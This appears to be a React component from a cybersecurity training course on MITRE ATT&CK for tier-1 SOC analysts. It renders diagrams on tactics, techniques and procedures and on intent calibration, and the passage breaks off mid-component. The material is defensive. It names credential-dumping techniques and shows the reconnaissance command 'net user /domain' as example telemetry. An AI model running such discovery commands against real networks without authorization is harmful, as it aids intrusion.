'use client';

import React, { useState } from 'react';
import { Badge } from '@/components/ui/badge';
import { sound } from '@/lib/sound-effects';
import {
  ttpTriadHierarchyNodes,
  matrixNavigationGridNodes,
  sharedVocabularyEngineNodes,
  descriptiveNotMaliceNodes,
  observableTechniquePipelineNodes,
  dualUseLolbinsParadoxNodes,
  credentialAccessMatrixNodes,
  discoveryTtpsReconNodes,
  discoveryCredentialBridgeNodes,
  techniqueSpecificityDepthNodes,
  plausibleVsSpeculativeNodes,
  evidenceThresholdMatrixNodes,
  evidentiaryAnchorsDossierNodes,
  uncertaintyConfidenceLevelsNodes,
  auditProofTriageDocketNodes,
  killChainLeapFallacyNodes,
  solidVsDottedLinksNodes,
  masterAttackSignoffNodes,
} from './module-13-visual-stories';
import {
  Clock,
  CheckCircle2,
  AlertTriangle,
  FileText,
  Shield,
  Activity,
  Terminal,
  Cpu,
  Eye,
  Key,
  Globe,
  Lock,
  Unlock,
  ArrowRight,
  Radio,
  Sliders,
  Check,
  AlertOctagon,
  FileCode,
  Share2,
  HardDrive,
  UserCheck,
  Zap,
  Server,
  Database,
  Filter,
  Monitor,
  Folder,
  Layers,
  Network,
  Binary,
  Hash,
  Download,
  Search,
  Wifi,
  Power,
  RefreshCw,
  GitCommit,
  Flame,
  Gauge,
  Workflow,
  Sparkles,
  Scale,
  Award,
  Mail,
  Send,
  Inbox,
  UserX,
  FileWarning,
  ExternalLink,
  MapPin,
  Compass,
  AlertCircle,
  Tag,
  Crosshair,
  Link2,
  HelpCircle,
  Fingerprint,
  ShieldCheck,
  ShieldAlert,
  Laptop,
  CheckCircle,
  XCircle,
  EyeOff,
  RotateCcw,
  Ban,
  Pause,
  BookOpen,
  Target,
  CheckCheck,
  ListFilter,
  Info,
  ShieldX,
  Bug,
} from 'lucide-react';
import { VisualNodeItem, VisualStoryStyle } from './interactive-visual-story-engine';

interface Module13GraphicRendererProps {
  style: VisualStoryStyle;
  selectedNodeId: string;
  onSelectNode: (node: VisualNodeItem) => void;
  animStep: number;
}

export function Module13GraphicRenderer({
  style,
  selectedNodeId,
  onSelectNode,
  animStep,
}: Module13GraphicRendererProps) {
  // Local interactive states for Module 13 visual scenarios
  const [selectedTtpLevel, setSelectedTtpLevel] = useState<'tactic' | 'technique' | 'procedure' | 'doctrine'>('technique');
  const [matrixView, setMatrixView] = useState<'all' | 'l1_focus' | 'subtechnique'>('l1_focus');
  const [vocabMode, setVocabMode] = useState<'vendor_chaos' | 'attck_normalized' | 'cross_team'>('attck_normalized');
  const [contextScenario, setContextScenario] = useState<'admin_sync' | 'attacker_recon'>('attacker_recon');
  const [pipelineStage, setPipelineStage] = useState<'raw_log' | 'parsing' | 'mitre_match' | 'evidence_docket'>('parsing');
  const [lolbinSelected, setLolbinSelected] = useState<'certutil' | 'powershell' | 'bitsadmin'>('certutil');
  const [credTechnique, setCredTechnique] = useState<'lsass' | 'spray' | 'vault'>('lsass');
  const [discCategory, setDiscCategory] = useState<'accounts' | 'network' | 'system'>('accounts');
  const [chainStage, setChainStage] = useState<1 | 2 | 3>(2);
  const [depthLevel, setDepthLevel] = useState<'parent' | 'subtechnique' | 'overclaim'>('subtechnique');
  const [claimMode, setClaimMode] = useState<'grounded' | 'speculative'>('grounded');
  const [gateSelected, setGateSelected] = useState<'path' | 'cli' | 'lineage'>('cli');
  const [anchorTab, setAnchorTab] = useState<'technique' | 'telemetry' | 'justification'>('telemetry');
  const [confidenceLevel, setConfidenceLevel] = useState<'high' | 'medium' | 'low'>('high');
  const [docketView, setDocketView] = useState<'rendered' | 'stix_json'>('rendered');
  const [fallacyMode, setFallacyMode] = useState<'hallucination' | 'calibrated'>('calibrated');
  const [graphView, setGraphView] = useState<'facts_only' | 'with_hypotheses'>('with_hypotheses');
  const [isDossierSigned, setIsDossierSigned] = useState<boolean>(false);

  // Helper to render the active inspection drawer at the bottom of each diagram
  const renderInspector = (node: VisualNodeItem | undefined) => {
    if (!node) return null;
    return (
      <div className="mt-4 p-4 rounded-2xl bg-gradient-to-r from-slate-900/95 via-[#081533]/90 to-slate-900/95 border border-sky-500/30 shadow-lg flex flex-col md:flex-row md:items-center justify-between gap-3 text-left">
        <div className="space-y-1">
          <div className="flex items-center gap-2 flex-wrap">
            <span className="text-xs font-mono font-bold text-sky-400 uppercase tracking-wider">
              INSPECTED NODE:
            </span>
            <span className="text-sm font-bold text-white">{node.label}</span>
            {node.badge && (
              <Badge className="bg-sky-500/20 text-sky-300 border-sky-500/30 text-[11px] font-mono">
                {node.badge}
              </Badge>
            )}
          </div>
          <p className="text-xs sm:text-sm text-slate-200 leading-relaxed">{node.description}</p>
          {node.details && (
            <p className="text-[11px] sm:text-xs text-sky-300/90 font-mono pt-0.5">{node.details}</p>
          )}
        </div>
        <div className="shrink-0 flex items-center gap-1.5 flex-wrap">
          {node.tags?.map((t) => (
            <span
              key={t}
              className="px-2 py-0.5 rounded-md bg-slate-800/80 border border-slate-700 text-[11px] font-mono text-slate-300"
            >
              #{t}
            </span>
          ))}
        </div>
      </div>
    );
  };

  // ---------------------------------------------------------------------------
  // 1. STYLE: m13-ttp-triad-hierarchy (TTP Triad Hierarchy)
  // ---------------------------------------------------------------------------
  if (style === 'm13-ttp-triad-hierarchy') {
    const nodes = ttpTriadHierarchyNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Target className="w-5 h-5 text-cyan-400" />
                <span>The TTP Triad: Tactic (Why), Technique (How) &amp; Procedure (Exactly What)</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Tactics define strategic objectives; techniques define behavioral mechanisms; procedures detail exact execution telemetry.
              </p>
            </div>
            <Badge className="bg-cyan-500/20 text-cyan-300 border-cyan-500/30 text-xs font-mono">
              TTP TRIAD
            </Badge>
          </div>

          {/* Triad Layer Selector */}
          <div className="flex items-center gap-2 bg-[#040c1e] p-2 rounded-xl border border-sky-500/30 flex-wrap">
            <span className="text-xs font-mono text-slate-400 pl-1 font-semibold">LAYER:</span>
            {[
              { id: 'tactic', label: '1. Tactic: The "Why"', node: 'ttp-tactic-objective' },
              { id: 'technique', label: '2. Technique: The "How"', node: 'ttp-technique-method' },
              { id: 'procedure', label: '3. Procedure: Exactly What', node: 'ttp-procedure-implementation' },
              { id: 'doctrine', label: '4. Ananya\'s Triad Doctrine', node: 'ttp-ananya-triad-doctrine' },
            ].map((st) => (
              <button
                key={st.id}
                type="button"
                onClick={() => {
                  sound.playClick();
                  setSelectedTtpLevel(st.id as any);
                  const target = nodes.find((n) => n.id === st.node);
                  if (target) onSelectNode(target);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  selectedTtpLevel === st.id
                    ? 'bg-cyan-500/25 border border-cyan-400 text-cyan-300 shadow-md shadow-cyan-500/20'
                    : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-slate-200'
                }`}
              >
                {st.label}
              </button>
            ))}
          </div>

          {/* Interactive Triad Visualizer */}
          <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-3">
            <div className="flex items-center justify-between text-xs font-mono border-b border-slate-800 pb-2">
              <span className="text-cyan-300 font-bold">BEHAVIORAL ABSTRACTION HIERARCHY</span>
              <Badge className="bg-emerald-500/20 text-emerald-300 border-emerald-500/30 text-[11px]">
                PYRAMID OF PAIN ALIGNMENT
              </Badge>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 font-mono text-xs">
              <div
                className={`p-3.5 rounded-xl border transition-all ${
                  selectedTtpLevel === 'tactic'
                    ? 'bg-cyan-950/60 border-cyan-400 shadow-md shadow-cyan-500/20'
                    : 'bg-slate-900/50 border-slate-800'
                }`}
              >
                <div className="flex items-center justify-between">
                  <span className="text-cyan-400 font-bold text-xs">TACTIC (THE "WHY")</span>
                  <Badge className="bg-cyan-950 border border-cyan-500/30 text-cyan-300 text-[11px]">TA0007</Badge>
                </div>
                <h5 className="font-bold text-sm text-white mt-2">Discovery</h5>
                <p className="text-slate-300 text-xs mt-1">Strategic Goal: Adversary wants situational awareness of host and network layout.</p>
                <div className="mt-2.5 pt-2 border-t border-slate-800/80 text-[11px] text-cyan-300 font-mono">
                  Durability: Highly Resilient (Adversary goals rarely change)
                </div>
              </div>

              <div
                className={`p-3.5 rounded-xl border transition-all ${
                  selectedTtpLevel === 'technique'
                    ? 'bg-blue-950/60 border-blue-400 shadow-md shadow-blue-500/20'
                    : 'bg-slate-900/50 border-slate-800'
                }`}
              >
                <div className="flex items-center justify-between">
                  <span className="text-blue-400 font-bold text-xs">TECHNIQUE (THE "HOW")</span>
                  <Badge className="bg-blue-950 border border-blue-500/30 text-blue-300 text-[11px]">T1087.002</Badge>
                </div>
                <h5 className="font-bold text-sm text-white mt-2">Domain Account Discovery</h5>
                <p className="text-slate-300 text-xs mt-1">Behavioral Mechanism: Querying directory services to map domain administrators.</p>
                <div className="mt-2.5 pt-2 border-t border-slate-800/80 text-[11px] text-blue-300 font-mono">
                  Durability: Medium-High (Mechanical pattern stays constant)
                </div>
              </div>

              <div
                className={`p-3.5 rounded-xl border transition-all ${
                  selectedTtpLevel === 'procedure'
                    ? 'bg-emerald-950/60 border-emerald-400 shadow-md shadow-emerald-500/20'
                    : 'bg-slate-900/50 border-slate-800'
                }`}
              >
                <div className="flex items-center justify-between">
                  <span className="text-emerald-400 font-bold text-xs">PROCEDURE (EXACTLY WHAT)</span>
                  <Badge className="bg-emerald-950 border border-emerald-500/30 text-emerald-300 text-[11px]">CLI TELEMETRY</Badge>
                </div>
                <h5 className="font-bold text-sm text-white mt-2">net user /domain</h5>
                <p className="text-slate-300 text-xs mt-1">Specific Execution: net.exe invoked via PowerShell with arguments under FIN-OPS-01.</p>
                <div className="mt-2.5 pt-2 border-t border-slate-800/80 text-[11px] text-emerald-300 font-mono">
                  Durability: Volatile (Easily swapped for Get-ADUser or adsi.dll)
                </div>
              </div>
            </div>

            <div className="p-2.5 rounded-lg bg-sky-950/30 border border-sky-500/30 flex items-center justify-between text-xs font-mono">
              <span className="text-slate-300">
                <span className="text-cyan-400 font-bold">ANANYA'S TRIAD LAW:</span> Attackers swap procedures continuously, but their tactical goal (TA0007) and technique (T1087) remain predictable.
              </span>
              <span className="text-emerald-400 font-bold shrink-0">BEHAVIORAL DEFENSE ✓</span>
            </div>
          </div>

          {/* 4 Node Selection Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-2">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'ttp-tactic-objective' ? (
                          <Target className="w-6 h-6 text-cyan-400" />
                        ) : node.id === 'ttp-technique-method' ? (
                          <Layers className="w-6 h-6 text-blue-400" />
                        ) : node.id === 'ttp-procedure-implementation' ? (
                          <Terminal className="w-6 h-6 text-emerald-400" />
                        ) : (
                          <ShieldCheck className="w-6 h-6 text-purple-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 2. STYLE: m13-matrix-navigation-grid (Matrix Navigation Grid)
  // ---------------------------------------------------------------------------
  if (style === 'm13-matrix-navigation-grid') {
    const nodes = matrixNavigationGridNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Compass className="w-5 h-5 text-cyan-400" />
                <span>Enterprise Matrix Navigation: 14 Tactics &amp; The L1 Triage Zone</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Navigate the 14 chronological tactical columns from Initial Access to Impact, prioritizing Execution, Credential Access &amp; Discovery.
              </p>
            </div>
            <Badge className="bg-cyan-500/20 text-cyan-300 border-cyan-500/30 text-xs font-mono">
              MATRIX NAVIGATOR
            </Badge>
          </div>

          {/* Matrix View Filter */}
          <div className="flex items-center gap-2 bg-[#040c1e] p-2 rounded-xl border border-sky-500/30 flex-wrap">
            <span className="text-xs font-mono text-slate-400 pl-1 font-semibold">VIEW:</span>
            {[
              { id: 'l1_focus', label: '1. L1 Core Focus Zone (80% Shift)', node: 'mat-l1-focus-quadrant' },
              { id: 'all', label: '2. All 14 Tactical Columns', node: 'mat-tactics-progression' },
              { id: 'subtechnique', label: '3. Sub-Technique Granularity', node: 'mat-technique-subtechnique' },
            ].map((st) => (
              <button
                key={st.id}
                type="button"
                onClick={() => {
                  sound.playClick();
                  setMatrixView(st.id as any);
                  const target = nodes.find((n) => n.id === st.node);
                  if (target) onSelectNode(target);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  matrixView === st.id
                    ? 'bg-cyan-500/25 border border-cyan-400 text-cyan-300 shadow-md shadow-cyan-500/20'
                    : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-slate-200'
                }`}
              >
                {st.label}
              </button>
            ))}
          </div>

          {/* Interactive Matrix Columns View */}
          <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-3 font-mono text-xs">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <span className="text-cyan-300 font-bold">ENTERPRISE ATT&amp;CK MATRIX V15</span>
              <span className="text-slate-400 text-[11px]">14 TACTICAL COLUMNS • 200+ TECHNIQUES</span>
            </div>

            {matrixView === 'l1_focus' ? (
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                <div className="p-3.5 rounded-xl bg-cyan-950/40 border border-cyan-500/40 space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-cyan-300 font-bold">TA0002: EXECUTION</span>
                    <Badge className="bg-cyan-500/20 text-cyan-300 text-[11px]">L1 PRIORITY #1</Badge>
                  </div>
                  <p className="text-slate-300 text-xs">Adversary running adversary-controlled code on endpoint.</p>
                  <div className="bg-slate-900/80 p-2 rounded border border-slate-800 space-y-1 text-[11px]">
                    <div className="text-white font-bold">T1059 Command &amp; Scripting</div>
                    <div className="text-cyan-400 pl-2">├── .001 PowerShell Engine</div>
                    <div className="text-slate-400 pl-2">└── .003 Windows Cmd Interpreter</div>
                  </div>
                </div>

                <div className="p-3.5 rounded-xl bg-purple-950/40 border border-purple-500/40 space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-purple-300 font-bold">TA0006: CRED ACCESS</span>
                    <Badge className="bg-purple-500/20 text-purple-300 text-[11px]">L1 PRIORITY #2</Badge>
                  </div>
                  <p className="text-slate-300 text-xs">Stealing credentials like account passwords and Kerberos tickets.</p>
                  <div className="bg-slate-900/80 p-2 rounded border border-slate-800 space-y-1 text-[11px]">
                    <div className="text-white font-bold">T1003 OS Credential Dumping</div>
                    <div className="text-purple-400 pl-2">├── .001 LSASS Memory Dump</div>
                    <div className="text-slate-400 pl-2">└── .002 SAM Database Hive</div>
                  </div>
                </div>

                <div className="p-3.5 rounded-xl bg-emerald-950/40 border border-emerald-500/40 space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-emerald-300 font-bold">TA0007: DISCOVERY</span>
                    <Badge className="bg-emerald-500/20 text-emerald-300 text-[11px]">L1 PRIORITY #3</Badge>
                  </div>
                  <p className="text-slate-300 text-xs">Gaining situational awareness of system and network topology.</p>
                  <div className="bg-slate-900/80 p-2 rounded border border-slate-800 space-y-1 text-[11px]">
                    <div className="text-white font-bold">T1087 Account Discovery</div>
                    <div className="text-emerald-400 pl-2">├── .001 Local Accounts</div>
                    <div className="text-emerald-400 pl-2">└── .002 Domain Directory Accounts</div>
                  </div>
                </div>
              </div>
            ) : matrixView === 'all' ? (
              <div className="grid grid-cols-2 sm:grid-cols-7 gap-2 text-center text-[11px]">
                {[
                  { name: 'Initial Access', id: 'TA0001' },
                  { name: 'Execution', id: 'TA0002', hl: true },
                  { name: 'Persistence', id: 'TA0003' },
                  { name: 'Priv Escalation', id: 'TA0004' },
                  { name: 'Defense Evasion', id: 'TA0005' },
                  { name: 'Cred Access', id: 'TA0006', hl: true },
                  { name: 'Discovery', id: 'TA0007', hl: true },
                  { name: 'Lateral Move', id: 'TA0008' },
                  { name: 'Collection', id: 'TA0009' },
                  { name: 'C2 Comms', id: 'TA0011' },
                  { name: 'Exfiltration', id: 'TA0010' },
                  { name: 'Impact', id: 'TA0040' },
                  { name: 'Reconnaissance', id: 'TA0043' },
                  { name: 'Resource Dev', id: 'TA0042' },
                ].map((col) => (
                  <div
                    key={col.id}
                    className={`p-2.5 rounded-lg border flex flex-col justify-between ${
                      col.hl
                        ? 'bg-cyan-950/50 border-cyan-400 text-white font-bold'
                        : 'bg-slate-900/50 border-slate-800 text-slate-300'
                    }`}
                  >
                    <span className="text-[11px] text-sky-400 font-mono">{col.id}</span>
                    <span className="mt-1">{col.name}</span>
                  </div>
                ))}
              </div>
            ) : (
              <div className="p-3.5 rounded-xl bg-slate-900/60 border border-slate-800 space-y-2">
                <span className="text-cyan-400 font-bold">TECHNIQUE HIERARCHY SPECIFICATION:</span>
                <p className="text-slate-300 text-xs">
                  Sub-techniques provide precise behavioral granularity without fragmenting detection rules.
                </p>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs pt-1">
                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800">
                    <span className="text-slate-400 font-semibold">PARENT: T1059</span>
                    <h5 className="font-bold text-white mt-1">Command and Scripting Interpreter</h5>
                    <p className="text-slate-300 text-[11px] mt-1">Broad categorization covering all scripts and shells.</p>
                  </div>
                  <div className="p-3 rounded-lg bg-cyan-950/40 border border-cyan-400">
                    <span className="text-cyan-300 font-semibold">SUB-TECHNIQUE: T1059.001</span>
                    <h5 className="font-bold text-white mt-1">PowerShell Execution</h5>
                    <p className="text-slate-300 text-[11px] mt-1">Explicitly verified via ScriptBlock logging and powershell.exe telemetry.</p>
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* 4 Node Selection Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-2">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'mat-tactics-progression' ? (
                          <Layers className="w-6 h-6 text-cyan-400" />
                        ) : node.id === 'mat-technique-subtechnique' ? (
                          <GitCommit className="w-6 h-6 text-blue-400" />
                        ) : node.id === 'mat-l1-focus-quadrant' ? (
                          <Crosshair className="w-6 h-6 text-purple-400" />
                        ) : (
                          <Compass className="w-6 h-6 text-emerald-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 3. STYLE: m13-shared-vocabulary-engine (Shared Vocabulary Engine)
  // ---------------------------------------------------------------------------
  if (style === 'm13-shared-vocabulary-engine') {
    const nodes = sharedVocabularyEngineNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Globe className="w-5 h-5 text-cyan-400" />
                <span>Shared Vocabulary Engine: Translating Vendor Hype into ATT&amp;CK Truth</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Normalize sensationalized proprietary vendor alerts into vendor-neutral, objective behavioral classifications.
              </p>
            </div>
            <Badge className="bg-cyan-500/20 text-cyan-300 border-cyan-500/30 text-xs font-mono">
              TAXONOMY ENGINE
            </Badge>
          </div>

          {/* Mode Toggle */}
          <div className="flex items-center gap-2 bg-[#040c1e] p-2 rounded-xl border border-sky-500/30 flex-wrap">
            <span className="text-xs font-mono text-slate-400 pl-1 font-semibold">VIEW:</span>
            {[
              { id: 'attck_normalized', label: '1. Normalized ATT&CK Truth', node: 'voc-mitre-normalization' },
              { id: 'vendor_chaos', label: '2. Proprietary Vendor Alarm Chaos', node: 'voc-vendor-alarm-chaos' },
              { id: 'cross_team', label: '3. Cross-Team Handshake Bridge', node: 'voc-cross-team-handshake' },
            ].map((st) => (
              <button
                key={st.id}
                type="button"
                onClick={() => {
                  sound.playClick();
                  setVocabMode(st.id as any);
                  const target = nodes.find((n) => n.id === st.node);
                  if (target) onSelectNode(target);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  vocabMode === st.id
                    ? 'bg-cyan-500/25 border border-cyan-400 text-cyan-300 shadow-md shadow-cyan-500/20'
                    : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-slate-200'
                }`}
              >
                {st.label}
              </button>
            ))}
          </div>

          {/* Interactive Translation Engine Display */}
          <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-3 font-mono text-xs">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <span className="text-cyan-300 font-bold">TAXONOMY NORMALIZER: ALERT #EDR-9921</span>
              <Badge className="bg-cyan-500/20 text-cyan-300 text-[11px]">VENDOR-NEUTRAL TRANSLATION</Badge>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div className={`p-3.5 rounded-xl border ${vocabMode === 'vendor_chaos' ? 'bg-rose-950/40 border-rose-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <div className="flex items-center justify-between">
                  <span className="text-rose-400 font-bold text-xs">PROPRIETARY VENDOR ALARM</span>
                  <Badge className="bg-rose-950 text-rose-300 border-rose-500/30 text-[11px]">HIGH SENSATIONALISM</Badge>
                </div>
                <div className="p-2.5 rounded bg-black/60 border border-rose-900/40 mt-2 text-rose-200 text-xs">
                  "CRITICAL: Heur.Trojan.ShadowStrike.Gen!d2 (Threat Score: 98/100)"
                </div>
                <p className="text-slate-400 text-xs mt-2">
                  Drawback: Vague marketing brand name. Tells the analyst nothing about what the executable actually attempted.
                </p>
              </div>

              <div className={`p-3.5 rounded-xl border ${vocabMode === 'attck_normalized' || vocabMode === 'cross_team' ? 'bg-cyan-950/40 border-cyan-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <div className="flex items-center justify-between">
                  <span className="text-cyan-300 font-bold text-xs">NORMALIZED ATT&amp;CK BEHAVIOR</span>
                  <Badge className="bg-emerald-950 text-emerald-300 border-emerald-500/30 text-[11px]">OBJECTIVE FACT</Badge>
                </div>
                <div className="p-2.5 rounded bg-black/60 border border-cyan-900/40 mt-2 text-cyan-200 text-xs space-y-1">
                  <div>Tactic: TA0007 (Discovery)</div>
                  <div>Technique: T1087.002 (Domain Account Discovery)</div>
                  <div>Procedure: <span className="text-white">net.exe user /domain</span></div>
                </div>
                <p className="text-slate-300 text-xs mt-2">
                  Benefit: IR, Threat Intel, and System Admins understand exactly what happened without vendor guesswork.
                </p>
              </div>
            </div>

            <div className="p-2.5 rounded-lg bg-slate-900/60 border border-slate-800 text-xs flex items-center justify-between">
              <span className="text-slate-300">
                <span className="text-cyan-400 font-bold">CROSS-TEAM IMPACT:</span> Tier-1 handoff to Tier-2 IR latency reduced by 70% using standard ATT&amp;CK technique IDs.
              </span>
              <span className="text-emerald-400 font-bold">ZERO FUD DEPLOYED ✓</span>
            </div>
          </div>

          {/* 4 Node Selection Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-2">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'voc-vendor-alarm-chaos' ? (
                          <AlertTriangle className="w-6 h-6 text-rose-400" />
                        ) : node.id === 'voc-mitre-normalization' ? (
                          <CheckCheck className="w-6 h-6 text-cyan-400" />
                        ) : node.id === 'voc-cross-team-handshake' ? (
                          <Share2 className="w-6 h-6 text-blue-400" />
                        ) : (
                          <Scale className="w-6 h-6 text-emerald-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 4. STYLE: m13-descriptive-not-malice (Descriptive Not Malice)
  // ---------------------------------------------------------------------------
  if (style === 'm13-descriptive-not-malice') {
    const nodes = descriptiveNotMaliceNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Scale className="w-5 h-5 text-cyan-400" />
                <span>The Descriptive Fallacy: Behavioral Mechanics vs Malicious Intent</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                An ATT&amp;CK tag describes *what* occurred technically, not *whether* it was authorized or malicious.
              </p>
            </div>
            <Badge className="bg-cyan-500/20 text-cyan-300 border-cyan-500/30 text-xs font-mono">
              INTENT CALIBRATION
            </Badge>
          </div>

          {/* Context Scenario Selector */}
          <div className="flex items-center gap-2 bg-[#040c1e] p-2 rounded-xl border border-sky-500/30 flex-wrap">
            <span className="text-xs font-mono text-slate-400 pl-1 font-semibold">SCENARIO:</span>
            {[
              { id: 'admin_sync', label: '1. Legitimate IT Admin (T1087 Benign)', node: 'des-context-evaluation' },
              { id: 'attacker_recon', label: '2. Unauthorized Adversary (T1087 Malicious)', node: 'des-observed-mechanic' },
            ].map((st) => (
              <button
                key={st.id}
                type="button"
                onClick={() => {
